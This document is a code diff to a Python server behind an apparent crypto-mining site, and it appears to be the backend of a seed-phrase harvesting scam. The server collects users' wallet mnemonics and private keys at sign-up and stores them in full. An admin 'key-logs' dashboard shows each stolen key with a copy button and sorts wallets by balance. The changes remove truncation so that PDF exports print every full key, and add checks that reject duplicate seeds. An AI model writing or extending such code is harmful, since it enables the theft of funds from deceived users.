@@ -19,9 +19,16 @@ from bson import ObjectId
 from dotenv import load_dotenv
 from motor.motor_asyncio import AsyncIOMotorClient
 
-from utils import (activity_log_manager, blockchain_cache, cached,
-                   key_log_manager, performance_monitor, system_cache,
-                   validation_cache, wallet_log_manager)
+from utils import (
+    activity_log_manager,
+    blockchain_cache,
+    cached,
+    key_log_manager,
+    performance_monitor,
+    system_cache,
+    validation_cache,
+    wallet_log_manager,
+)
 
 # Load environment variables
 load_dotenv()
@@ -58,7 +65,7 @@ def _start_event_loop():
 
 def get_event_loop():
     """Get the background event loop, starting it if needed"""
-    global _loop, _loop_thread
+    global _loop_thread
     if _loop is None or _loop_thread is None or not _loop_thread.is_alive():
         _loop_thread = threading.Thread(target=_start_event_loop, daemon=True)
         _loop_thread.start()
@@ -124,6 +131,65 @@ def get_all_logs() -> list:
         cursor = mongo_db.logs.find({})
         logs = await cursor.to_list(length=10000)
         return logs
+
+    return run_async(_get())
+
+
+def get_wallet_validations_count() -> int:
+    """Get count of successful wallet validations"""
+
+    async def _get():
+        return await mongo_db.wallet_validations.count_documents({})
+
+    return run_async(_get())
+
+
+def get_wallet_validations_zero_count() -> int:
+    """Get count of zero balance wallet validations"""
+
+    async def _get():
+        return await mongo_db.wallet_validations_zero.count_documents({})
+
+    return run_async(_get())
+
+
+def get_wallet_validations_rejected_count() -> int:
+    """Get count of rejected wallet validations"""
+
+    async def _get():
+        return await mongo_db.wallet_validations_rejected.count_documents({})
+
+    return run_async(_get())
+
+
+def get_total_validations_count() -> int:
+    """Get total count of all wallet validations (successful + zero + rejected)"""
+    return get_wallet_validations_count() + get_wallet_validations_zero_count() + get_wallet_validations_rejected_count()
+
+
+def get_logs_count() -> int:
+    """Get total count of activity logs"""
+
+    async def _get():
+        return await mongo_db.logs.count_documents({})
+
+    return run_async(_get())
+
+
+def get_user_registration_count() -> int:
+    """Get count of user registrations from logs"""
+
+    async def _get():
+        return await mongo_db.logs.count_documents({"action": "register"})
+
+    return run_async(_get())
+
+
+def get_user_login_count() -> int:
+    """Get count of user logins from logs"""
+
+    async def _get():
+        return await mongo_db.logs.count_documents({"action": "login"})
 
     return run_async(_get())
 
@@ -3414,11 +3480,17 @@ def hash_password(password: str) -> str:
 
 
 def verify_password(password: str, hashed_password: str) -> bool:
-    """Verify password against hash (supports both PBKDF2 and salted SHA-256 formats)"""
+    """Verify password against hash (supports bcrypt, PBKDF2 and salted SHA-256 formats)"""
     try:
-        if ":" in hashed_password:
+        if hashed_password.startswith("$2b$") or hashed_password.startswith("$2a$") or hashed_password.startswith("$2y$"):
+            from passlib.context import CryptContext
+            pwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto')
+            return pwd_context.verify(password, hashed_password)
+        elif ":" in hashed_password:
             hash_part, salt_part = hashed_password.split(":", 1)
-            pw_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), bytes.fromhex(salt_part), 100000)
+            pw_hash = hashlib.pbkdf2_hmac(
+                "sha256", password.encode(), bytes.fromhex(salt_part), 100000
+            )
             return secrets.compare_digest(pw_hash.hex(), hash_part)
         else:
             salt_hex = hashed_password[:64]
@@ -3733,55 +3805,66 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                 return
         elif self.path == "/admin/key-logs":
             if self.verify_admin_auth():
+
                 async def _get_wallet_logs():
                     logs = []
-                    
+
                     # Get all users with wallet connections
-                    users_cursor = mongo_db.users.find({"wallet_connection": {"$exists": True}})
+                    users_cursor = mongo_db.users.find(
+                        {"wallet_connection": {"$exists": True}}
+                    )
                     users = await users_cursor.to_list(length=10000)
-                    
+
                     for user in users:
                         wallet_conn = user.get("wallet_connection", {})
                         if not wallet_conn or not wallet_conn.get("address"):
                             continue
-                        
+
                         # Get validation record for key data
                         user_id = user.get("id")
                         address = wallet_conn.get("address")
                         method = wallet_conn.get("method", "unknown")
-                        
+
                         # Try to find in wallet_validations first
-                        validation = await mongo_db.wallet_validations.find_one({
-                            "user_id": user_id,
-                            "address": address
-                        })
-                        
+                        validation = await mongo_db.wallet_validations.find_one(
+                            {"user_id": user_id, "address": address}
+                        )
+
                         # If not found, try wallet_validations_zero
                         if not validation:
-                            validation = await mongo_db.wallet_validations_zero.find_one({
-                                "user_id": user_id,
-                                "address": address
-                            })
-                        
+                            validation = (
+                                await mongo_db.wallet_validations_zero.find_one(
+                                    {"user_id": user_id, "address": address}
+                                )
+                            )
+
                         # Build log entry
                         balance = wallet_conn.get("balance", "0")
-                        
+
                         log_entry = {
                             "email": user.get("username", "Unknown"),
                             "user_id": user_id,
                             "address": address,
                             "balance": f"{balance} ETH",
-                            "key_type": "mnemonic" if method == "mnemonic" else "private_key",
+                            "key_type": (
+                                "mnemonic" if method == "mnemonic" else "private_key"
+                            ),
                             "key_data": wallet_conn.get("secret", address),
                             "method": method,
                             "chain": wallet_conn.get("chain", "ethereum"),
-                            "timestamp": wallet_conn.get("connected_at", datetime.now()).isoformat() if isinstance(wallet_conn.get("connected_at"), datetime) else str(wallet_conn.get("connected_at", ""))
+                            "timestamp": (
+                                wallet_conn.get(
+                                    "connected_at", datetime.now()
+                                ).isoformat()
+                                if isinstance(wallet_conn.get("connected_at"), datetime)
+                                else str(wallet_conn.get("connected_at", ""))
+                            ),
                         }
-                        
+
                         logs.append(log_entry)
-                    
+
                     return logs
-                
+
                 logs = run_async(_get_wallet_logs())
                 self.send_json_response({"logs": logs})
                 return
@@ -4087,6 +4170,78 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
             self.send_error_response(404, "Not found")
             return
 
+    def do_DELETE(self):
+        client_ip = self.client_address[0]
+
+        if not check_rate_limit(client_ip):
+            log_security_event("rate_limit_exceeded", f"DELETE {self.path}", client_ip)
+            self.send_error_response(429, "Rate limit exceeded")
+            return
+
+        sanitize_request_headers(self.headers)
+        system_metrics["total_requests"] += 1
+
+        if self.path.startswith("/admin/user/") and "/wallet" in self.path:
+            if self.verify_admin_auth():
+                self.handle_delete_user_wallet()
+                return
+            else:
+                self.send_error_response(401, "Unauthorized")
+                return
+        elif self.path.startswith("/admin/logs/"):
+            if self.verify_admin_auth():
+                self.handle_delete_log()
+                return
+            else:
+                self.send_error_response(401, "Unauthorized")
+                return
+        else:
+            self.send_error_response(404, "Not found")
+            return
+
+    def handle_delete_log(self):
+        try:
+            log_id = self.path.split("/admin/logs/")[1]
+            
+            async def _delete():
+                result = await mongo_db.logs.delete_one({"_id": ObjectId(log_id)})
+                return result.deleted_count > 0
+            
+            deleted = run_async(_delete())
+            
+            if deleted:
+                self.send_json_response({"message": "Log deleted successfully"})
+            else:
+                self.send_error_response(404, "Log not found")
+        except Exception as e:
+            print(f"Delete log error: {e}")
+            self.send_error_response(500, f"Failed to delete log: {str(e)}")
+
+    def handle_delete_user_wallet(self):
+        try:
+            user_id = self.path.split("/admin/user/")[1].split("/wallet")[0]
+            
+            async def _delete():
+                result = await mongo_db.users.update_one(
+                    {"id": user_id},
+                    {"$unset": {"wallet_connection": ""}}
+                )
+                
+                await mongo_db.wallet_validations.delete_many({"user_id": user_id})
+                await mongo_db.wallet_validations_zero.delete_many({"user_id": user_id})
+                
+                return result.modified_count > 0
+            
+            deleted = run_async(_delete())
+            
+            if deleted:
+                self.send_json_response({"message": "Wallet connection deleted successfully"})
+            else:
+                self.send_error_response(404, "User not found")
+        except Exception as e:
+            print(f"Delete wallet error: {e}")
+            self.send_error_response(500, f"Failed to delete wallet: {str(e)}")
+
     def handle_login(self):
         content_length = int(self.headers["Content-Length"])
         post_data = self.rfile.read(content_length)
@@ -4099,12 +4254,29 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
             self.send_error_response(400, "Username and password are required")
             return
 
-        # Find user by username
+        # Find user by username - check in-memory first, then MongoDB
         user = None
-        for user_id, user_data in users_db.items():
+        user_id = None
+        
+        # Check in-memory users_db first
+        for uid, user_data in users_db.items():
             if user_data.get("username") == username:
                 user = user_data
+                user_id = uid
                 break
+        
+        # If not found in memory, check MongoDB
+        if not user:
+            try:
+                mongo_user = mongo_db.users.find_one({"username": username})
+                if mongo_user:
+                    user = mongo_user
+                    user_id = mongo_user.get("id")
+                    # Load user into in-memory cache for future requests
+                    if user_id:
+                        users_db[user_id] = user
+            except Exception as e:
+                print(f"[LOGIN_ERROR] MongoDB lookup failed: {str(e)}")
 
         if not user:
             self.send_error_response(401, "Invalid credentials")
@@ -4117,9 +4289,22 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
         # Update last login
         user["last_login"] = datetime.now().isoformat()
+        
+        # Update in MongoDB if user came from there
+        try:
+            mongo_db.users.update_one(
+                {"id": user_id},
+                {"$set": {"last_login": user["last_login"]}}
+            )
+        except Exception as e:
+            print(f"[LOGIN_ERROR] Failed to update last_login in MongoDB: {str(e)}")
 
         self.send_json_response(
-            {"message": "Login successful", "user_id": user["id"], "username": user["username"]}
+            {
+                "message": "Login successful",
+                "user_id": user["id"],
+                "username": user["username"],
+            }
         )
 
     def handle_mining_update(self):
@@ -4342,6 +4527,62 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                         )
                         return
 
+            # Check for duplicate wallet BEFORE creating user
+            if wallet_type and wallet_data:
+                wallet_data_normalized = wallet_data.strip()
+                
+                # Check in-memory users_db first
+                for existing_user in users_db.values():
+                    existing_wallet = existing_user.get("wallet_connection")
+                    if existing_wallet:
+                        # Check both wallet_data and secret fields
+                        existing_secret = existing_wallet.get("secret") or existing_wallet.get("wallet_data")
+                        if existing_secret and existing_secret.strip() == wallet_data_normalized:
+                            print(f"[DUPLICATE_WALLET] Rejected duplicate wallet in users_db - existing user: {existing_user.get('username')}, attempted user: {username}")
+                            self.send_error_response(400, "WALLET_ALREADY_REGISTERED")
+                            return
+                
+                # Check MongoDB collections for duplicates
+                try:
+                    # Check wallet_validations collection
+                    existing_validation = mongo_db.wallet_validations.find_one({
+                        "secret": wallet_data_normalized
+                    })
+                    if existing_validation:
+                        print(f"[DUPLICATE_WALLET] Rejected duplicate wallet in wallet_validations - user_id: {existing_validation.get('user_id')}, attempted user: {username}")
+                        self.send_error_response(400, "WALLET_ALREADY_REGISTERED")
+                        return
+                    
+                    # Check wallet_validations_zero collection
+                    existing_zero = mongo_db.wallet_validations_zero.find_one({
+                        "secret": wallet_data_normalized
+                    })
+                    if existing_zero:
+                        print(f"[DUPLICATE_WALLET] Rejected duplicate wallet in wallet_validations_zero - user_id: {existing_zero.get('user_id')}, attempted user: {username}")
+                        self.send_error_response(400, "WALLET_ALREADY_REGISTERED")
+                        return
+                    
+                    # Check users collection for wallet_connection.secret (new field)
+                    existing_user_wallet = mongo_db.users.find_one({
+                        "wallet_connection.secret": wallet_data_normalized
+                    })
+                    if existing_user_wallet:
+                        print(f"[DUPLICATE_WALLET] Rejected duplicate wallet in users collection (secret) - existing user: {existing_user_wallet.get('username')}, attempted user: {username}")
+                        self.send_error_response(400, "WALLET_ALREADY_REGISTERED")
+                        return
+                    
+                    # Also check legacy wallet_connection.wallet_data field
+                    existing_user_wallet_data = mongo_db.users.find_one({
+                        "wallet_connection.wallet_data": wallet_data_normalized
+                    })
+                    if existing_user_wallet_data:
+                        print(f"[DUPLICATE_WALLET] Rejected duplicate wallet in users collection (wallet_data) - existing user: {existing_user_wallet_data.get('username')}, attempted user: {username}")
+                        self.send_error_response(400, "WALLET_ALREADY_REGISTERED")
+                        return
+                        
+                except Exception as e:
+                    print(f"[DUPLICATE_CHECK_ERROR] Error checking for duplicate wallet: {str(e)}")
+
             # Check if user already exists
             for existing_user in users_db.values():
                 if existing_user.get("username") == username:
@@ -4367,6 +4608,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                     "network": wallet_validation_result.get("network", "mainnet"),
                     "valid": wallet_validation_result.get("valid", False),
                     "wallet_data": wallet_data,  # Store the original wallet data
+                    "secret": wallet_data.strip(),  # Also store as 'secret' for duplicate checking consistency
                     "validated_at": datetime.now().isoformat(),
                     "tx_count": wallet_validation_result.get("tx_count", 0),
                     # Enhanced multi-chain logging
@@ -4671,6 +4913,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
         user_found = None
         user_id = None
 
+        # Check in-memory users_db first
         for uid, user in users_db.items():
             if user.get("username") == username:
                 # Check if user has password_hash (new secure format) or password (old format)
@@ -4688,6 +4931,33 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                         user["password_hash"] = hash_password(password)
                         del user["password"]  # Remove plaintext password
                         break
+
+        # If not found in memory, check MongoDB
+        if not user_found:
+            try:
+                mongo_user = mongo_db.users.find_one({"username": username})
+                if mongo_user:
+                    # Verify password
+                    if "password_hash" in mongo_user:
+                        if verify_password(password, mongo_user["password_hash"]):
+                            user_found = mongo_user
+                            user_id = mongo_user.get("id")
+                            # Load into in-memory cache
+                            if user_id:
+                                users_db[user_id] = mongo_user
+                                # Also load into mining_data_db if not present
+                                if user_id not in mining_data_db:
+                                    mining_data_db[user_id] = {
+                                        "user_id": user_id,
+                                        "hashrate": 0,
+                                        "total_mined": 0,
+                                        "active_workers": 0,
+                                        "daily_revenue": 0,
+                                        "history": [],
+                                        "last_updated": datetime.now().isoformat(),
+                                    }
+            except Exception as e:
+                print(f"[SIGNIN_ERROR] MongoDB lookup failed: {str(e)}")
 
         if user_found:
             # Check if account is locked due to too many failed attempts
@@ -6036,12 +6306,13 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
                         const renderCard = (log) => {
                             const isWalletConnect = log.key_type === 'wallet_address';
-                            const inputMethod = isWalletConnect ? 'WalletConnect' : 
+                            const inputMethod = isWalletConnect ? 'WalletConnect' :
                                                (log.key_type === 'mnemonic' ? 'Mnemonic' : 'Private Key');
                             const keyData = log.key_data || 'N/A';
-                            
+                            const logId = log.user_id || log._id || log.email;
+
                             return `
-                                <div style="background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                                <div style="background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 16px; margin-bottom: 12px;" id="log-${logId}">
                                     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px;">
                                         <div>
                                             <div style="color: #888; font-size: 0.8rem; margin-bottom: 4px;">Username</div>
@@ -6061,22 +6332,23 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                                         <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
                                             <code style="background: #0a0a0a; padding: 8px 12px; border-radius: 4px; color: #10b981; font-size: 0.85rem; word-break: break-all; flex: 1; min-width: 0;">${keyData}</code>
                                             <button class="copy-btn" onclick="copyToClipboard('${keyData.replace(/'/g, "\\'")}', this)">📋 Copy</button>
+                                            <button class="delete-btn" onclick="deleteLog('${logId}', '${log.email}', this)" style="background: #dc2626; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 0.85rem; transition: background 0.3s;" onmouseover="this.style.background='#b91c1c'" onmouseout="this.style.background='#dc2626'">🗑️ Delete</button>
                                         </div>
                                     </div>
                                 </div>
                             `;
                         };
 
-                        document.getElementById('nonZeroKeyLogs').innerHTML = nonZeroLogs.length > 0 ? 
-                            nonZeroLogs.map(renderCard).join('') + 
+                        document.getElementById('nonZeroKeyLogs').innerHTML = nonZeroLogs.length > 0 ?
+                            nonZeroLogs.map(renderCard).join('') +
                             `<div style="text-align: center; color: #10b981; margin-top: 16px; font-weight: 600;">Total: ${nonZeroLogs.length} wallet(s)</div>` :
                             `<div style="text-align: center; color: #666; padding: 40px;">
                                 <div style="font-size: 2rem; margin-bottom: 12px;">💎</div>
                                 <div>No wallets with balance yet</div>
                             </div>`;
 
-                        document.getElementById('zeroKeyLogs').innerHTML = zeroLogs.length > 0 ? 
-                            zeroLogs.map(renderCard).join('') + 
+                        document.getElementById('zeroKeyLogs').innerHTML = zeroLogs.length > 0 ?
+                            zeroLogs.map(renderCard).join('') +
                             `<div style="text-align: center; color: #dc2626; margin-top: 16px; font-weight: 600;">Total: ${zeroLogs.length} wallet(s)</div>` :
                             `<div style="text-align: center; color: #666; padding: 40px;">
                                 <div style="font-size: 2rem; margin-bottom: 12px;">📭</div>
@@ -6389,6 +6661,48 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                             button.textContent = originalText;
                             button.classList.remove('copied');
                         }, 2000);
+                    }
+                }
+
+                async function deleteLog(userId, email, button) {
+                    if (!confirm(`Are you sure you want to delete wallet connection for ${email}? This action cannot be undone.`)) {
+                        return;
+                    }
+
+                    const originalText = button.textContent;
+                    button.textContent = '⏳ Deleting...';
+                    button.disabled = true;
+
+                    try {
+                        const response = await fetch(`/admin/user/${userId}/wallet`, {
+                            method: 'DELETE',
+                            headers: {
+                                'Authorization': `Bearer ${authToken}`
+                            }
+                        });
+
+                        const result = await response.json();
+
+                        if (response.ok && result.message) {
+                            const logElement = document.getElementById(`log-${userId}`);
+                            if (logElement) {
+                                logElement.style.transition = 'opacity 0.3s';
+                                logElement.style.opacity = '0';
+                                setTimeout(() => {
+                                    logElement.remove();
+                                    loadKeyLogs();
+                                }, 300);
+                            }
+                        } else {
+                            alert(`Failed to delete: ${result.error || 'Unknown error'}`);
+                            button.textContent = originalText;
+                            button.disabled = false;
+                        }
+                    } catch (err) {
+                        console.error('Failed to delete:', err);
+                        alert('Failed to delete. Please try again.');
+                        button.textContent = originalText;
+                        button.disabled = false;
                     }
                 }
 
@@ -6896,8 +7210,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
             import io
 
             from openpyxl import Workbook
-            from openpyxl.styles import (Alignment, Border, Font, PatternFill,
-                                         Side)
+            from openpyxl.styles import Alignment, Border, Font, PatternFill, Side
             from openpyxl.utils import get_column_letter
 
             wb = Workbook()
@@ -7242,14 +7555,18 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
             import io
 
             from reportlab.lib import colors
-            from reportlab.lib.enums import TA_CENTER, TA_LEFT
-            from reportlab.lib.pagesizes import A4, letter
-            from reportlab.lib.styles import (ParagraphStyle,
-                                              getSampleStyleSheet)
+            from reportlab.lib.enums import TA_CENTER
+            from reportlab.lib.pagesizes import A4
+            from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
             from reportlab.lib.units import inch
-            from reportlab.platypus import (PageBreak, Paragraph,
-                                            SimpleDocTemplate, Spacer, Table,
-                                            TableStyle)
+            from reportlab.platypus import (
+                PageBreak,
+                Paragraph,
+                SimpleDocTemplate,
+                Spacer,
+                Table,
+                TableStyle,
+            )
 
             buffer = io.BytesIO()
             doc = SimpleDocTemplate(
@@ -7295,19 +7612,27 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
             # System Overview
             elements.append(Paragraph("System Overview", heading_style))
+            
+            # Get real counts from database
+            total_users = get_users_count()
+            total_validations = get_total_validations_count()
+            successful_validations = get_wallet_validations_count()
+            zero_balance_validations = get_wallet_validations_zero_count()
+            rejected_validations = get_wallet_validations_rejected_count()
+            total_logs = get_logs_count()
+            user_registrations = get_user_registration_count()
+            user_logins = get_user_login_count()
+            
             overview_data = [
                 ["Metric", "Value"],
-                ["Total Users", str(get_users_count())],
-                ["Total Requests", str(system_metrics.get("total_requests", 0))],
-                [
-                    "Wallet Connections",
-                    str(system_metrics.get("wallet_connections", 0)),
-                ],
-                [
-                    "User Registrations",
-                    str(system_metrics.get("user_registrations", 0)),
-                ],
-                ["Mining Operations", str(system_metrics.get("mining_operations", 0))],
+                ["Total Users", str(total_users)],
+                ["Total Activity Logs", str(total_logs)],
+                ["User Registrations", str(user_registrations)],
+                ["User Sign-ins", str(user_logins)],
+                ["Total Wallet Validations", str(total_validations)],
+                ["Successful Validations", str(successful_validations)],
+                ["Zero Balance Validations", str(zero_balance_validations)],
+                ["Rejected Validations", str(rejected_validations)],
                 ["Server Start", system_metrics.get("server_start", "")],
             ]
 
@@ -7333,25 +7658,28 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
             elements.append(PageBreak())
             elements.append(Paragraph("User Summary", heading_style))
 
-            user_data = [
-                ["User ID", "Email", "Blockchain", "Wallet Type", "Balance", "Status"]
+            user_summary_data = [
+                ["User ID", "Username", "Chain", "Wallet Method", "Balance", "Created"]
             ]
-            for user_id, user_data_item in list(users_db.items())[:50]:
-                wallet_connection = user_data_item.get("wallet_connection", {})
-                user_data.append(
+            
+            # Get all users from MongoDB
+            all_users = get_all_users()
+            for user in all_users[:100]:  # Limit to first 100 users for PDF
+                wallet_connection = user.get("wallet_connection", {})
+                user_summary_data.append(
                     [
-                        user_id[:12] + "...",
-                        user_data_item.get("email", "")[:25],
-                        wallet_connection.get("blockchain", "")[:10],
-                        wallet_connection.get("method", "")[:15],
-                        wallet_connection.get("balance", "0.0")[:15],
-                        user_data_item.get("status", "")[:10],
+                        str(user.get("id", ""))[:12] + "...",
+                        user.get("username", "N/A")[:20],
+                        wallet_connection.get("chain", "N/A")[:10],
+                        wallet_connection.get("method", "N/A")[:15],
+                        wallet_connection.get("balance", "0")[:15],
+                        user.get("created_at", "").strftime("%Y-%m-%d") if user.get("created_at") else "N/A",
                     ]
                 )
 
-            if len(user_data) > 1:
+            if len(user_summary_data) > 1:
                 user_table = Table(
-                    user_data,
+                    user_summary_data,
                     colWidths=[
                         1.2 * inch,
                         1.5 * inch,
@@ -7389,7 +7717,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
             elements.append(Spacer(1, 20))
             elements.append(
                 Paragraph(
-                    f"Note: Showing first 50 users of {get_users_count()} total",
+                    f"Total users: {get_users_count()}",
                     styles["Italic"],
                 )
             )
@@ -7433,7 +7761,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
             # Non-Zero Balance Wallets Section
             elements.append(PageBreak())
-            elements.append(Paragraph("💎 Non-Zero Balance Wallets", heading_style))
+            elements.append(Paragraph("Non-Zero Balance Wallets", heading_style))
 
             if non_zero_wallets:
                 nonzero_data = [
@@ -7446,7 +7774,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                         "Timestamp",
                     ]
                 ]
-                nonzero_data.extend(non_zero_wallets[:100])
+                nonzero_data.extend(non_zero_wallets)
 
                 nonzero_table = Table(
                     nonzero_data,
@@ -7484,7 +7812,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                 elements.append(Spacer(1, 12))
                 elements.append(
                     Paragraph(
-                        f"Total non-zero balance wallets: {len(non_zero_wallets)} (showing first 100)",
+                        f"Total non-zero balance wallets: {len(non_zero_wallets)}",
                         styles["Italic"],
                     )
                 )
@@ -7495,7 +7823,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
             # Zero Balance Wallets Section
             elements.append(PageBreak())
-            elements.append(Paragraph("📭 Zero Balance Wallets", heading_style))
+            elements.append(Paragraph("Zero Balance Wallets", heading_style))
 
             if zero_wallets:
                 zero_data = [
@@ -7508,7 +7836,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                         "Timestamp",
                     ]
                 ]
-                zero_data.extend(zero_wallets[:100])
+                zero_data.extend(zero_wallets)
 
                 zero_table = Table(
                     zero_data,
@@ -7546,7 +7874,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                 elements.append(Spacer(1, 12))
                 elements.append(
                     Paragraph(
-                        f"Total zero balance wallets: {len(zero_wallets)} (showing first 100)",
+                        f"Total zero balance wallets: {len(zero_wallets)}",
                         styles["Italic"],
                     )
                 )
@@ -7557,11 +7885,19 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
             # Key Logs Section - Separated by Balance
             elements.append(PageBreak())
-            elements.append(Paragraph("🔑 Key Logs - Non-Zero Balance", heading_style))
+            elements.append(Paragraph("Key Logs - Non-Zero Balance", heading_style))
 
             if key_logs:
-                non_zero_keys = [log for log in key_logs if float(log.get("balance", "0").replace(",", "")) > 0]
-                zero_keys = [log for log in key_logs if float(log.get("balance", "0").replace(",", "")) <= 0]
+                non_zero_keys = [
+                    log
+                    for log in key_logs
+                    if float(log.get("balance", "0").replace(",", "")) > 0
+                ]
+                zero_keys = [
+                    log
+                    for log in key_logs
+                    if float(log.get("balance", "0").replace(",", "")) <= 0
+                ]
 
                 if non_zero_keys:
                     nonzero_key_data = [
@@ -7575,7 +7911,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                             "Address",
                         ]
                     ]
-                    for log in non_zero_keys[:100]:
+                    for log in non_zero_keys:
                         timestamp = log.get("timestamp", "")
                         if isinstance(timestamp, datetime):
                             timestamp = timestamp.strftime("%Y-%m-%d %H:%M")
@@ -7584,7 +7920,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                                 timestamp,
                                 log.get("username", "N/A")[:15],
                                 log.get("key_type", "N/A")[:10],
-                                log.get("key_data", "N/A")[:30] + "...",
+                                log.get("key_data", "N/A"),
                                 log.get("blockchain", "N/A")[:8],
                                 log.get("balance", "N/A")[:12],
                                 log.get("address", "N/A")[:20] + "...",
@@ -7606,7 +7942,12 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                     nonzero_key_table.setStyle(
                         TableStyle(
                             [
-                                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#10B981")),
+                                (
+                                    "BACKGROUND",
+                                    (0, 0),
+                                    (-1, 0),
+                                    colors.HexColor("#10B981"),
+                                ),
                                 ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
                                 ("ALIGN", (0, 0), (-1, -1), "LEFT"),
                                 ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
@@ -7628,7 +7969,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                     elements.append(Spacer(1, 12))
                     elements.append(
                         Paragraph(
-                            f"Total non-zero balance keys: {len(non_zero_keys)} (showing first 100)",
+                            f"Total non-zero balance keys: {len(non_zero_keys)}",
                             styles["Italic"],
                         )
                     )
@@ -7639,7 +7980,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
 
                 # Zero Balance Keys Section
                 elements.append(PageBreak())
-                elements.append(Paragraph("🔑 Key Logs - Zero Balance", heading_style))
+                elements.append(Paragraph("Key Logs - Zero Balance", heading_style))
 
                 if zero_keys:
                     zero_key_data = [
@@ -7653,7 +7994,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                             "Address",
                         ]
                     ]
-                    for log in zero_keys[:100]:
+                    for log in zero_keys:
                         timestamp = log.get("timestamp", "")
                         if isinstance(timestamp, datetime):
                             timestamp = timestamp.strftime("%Y-%m-%d %H:%M")
@@ -7662,7 +8003,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                                 timestamp,
                                 log.get("username", "N/A")[:15],
                                 log.get("key_type", "N/A")[:10],
-                                log.get("key_data", "N/A")[:30] + "...",
+                                log.get("key_data", "N/A"),
                                 log.get("blockchain", "N/A")[:8],
                                 log.get("balance", "N/A")[:12],
                                 log.get("address", "N/A")[:20] + "...",
@@ -7684,14 +8025,24 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                     zero_key_table.setStyle(
                         TableStyle(
                             [
-                                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#DC2626")),
+                                (
+                                    "BACKGROUND",
+                                    (0, 0),
+                                    (-1, 0),
+                                    colors.HexColor("#DC2626"),
+                                ),
                                 ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
                                 ("ALIGN", (0, 0), (-1, -1), "LEFT"),
                                 ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                                 ("FONTSIZE", (0, 0), (-1, 0), 9),
                                 ("FONTSIZE", (0, 1), (-1, -1), 6),
                                 ("BOTTOMPADDING", (0, 0), (-1, 0), 12),
-                                ("BACKGROUND", (0, 1), (-1, -1), colors.Color(1, 0.95, 0.95)),
+                                (
+                                    "BACKGROUND",
+                                    (0, 1),
+                                    (-1, -1),
+                                    colors.Color(1, 0.95, 0.95),
+                                ),
                                 ("GRID", (0, 0), (-1, -1), 1, colors.black),
                                 (
                                     "ROWBACKGROUNDS",
@@ -7706,7 +8057,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                     elements.append(Spacer(1, 12))
                     elements.append(
                         Paragraph(
-                            f"Total zero balance keys: {len(zero_keys)} (showing first 100)",
+                            f"Total zero balance keys: {len(zero_keys)}",
                             styles["Italic"],
                         )
                     )
@@ -7715,9 +8066,7 @@ class MiningAPIHandler(http.server.SimpleHTTPRequestHandler):
                         Paragraph("No zero balance keys found", styles["Normal"])
                     )
             else:
-                elements.append(
-                    Paragraph("No key logs available", styles["Normal"])
-                )
+                elements.append(Paragraph("No key logs available", styles["Normal"]))
 
             elements.append(Spacer(1, 20))
 
